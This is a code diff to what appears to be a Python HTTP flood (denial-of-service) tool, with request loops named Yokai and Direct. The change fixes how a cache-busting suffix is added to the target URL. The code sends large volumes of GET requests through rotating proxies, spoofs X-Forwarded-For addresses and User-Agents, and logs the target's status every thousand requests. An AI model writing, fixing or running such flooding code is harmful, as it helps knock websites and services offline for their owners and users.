@@ -183,14 +183,13 @@ async def Yokai(session):
 
     async def _call(i):
         try:
-            url = url + Functions.Cache()
             kai = choice(Options.yokais)
             header.update({
                 "User-Agent": choice(Options.ua),
                 "X-Forwarded-For": kai,
             })
             server = "{}://{}".format(Options.v_type, kai)
-            async with session.get(url=url, allow_redirects=False, ssl=False, proxy=server, headers=header) as response:
+            async with session.get(url=url + Functions.Cache(), allow_redirects=False, ssl=False, proxy=server, headers=header) as response:
                 sem.release()
                 if i % 1000 == 0:
                     Functions.Success("Target: {} | Thread: {} | Status: {}".format(url, i, response.status))
@@ -226,12 +225,11 @@ async def Direct(session):
 
     async def _call(i):
         try:
-            url = url + Functions.Cache()
             header.update({
                 "User-Agent": choice(Options.ua),
                 "X-Forwarded-For": Functions.FakeIP(),
             })
-            async with session.get(url=url, allow_redirects=False, ssl=False, headers=header) as response:
+            async with session.get(url=url + Functions.Cache(), allow_redirects=False, ssl=False, headers=header) as response:
                 sem.release()
                 if i % 1000 == 0:
                     Functions.Success("Target: {} | Thread: {} | Status: {}".format(url, i, response.status))
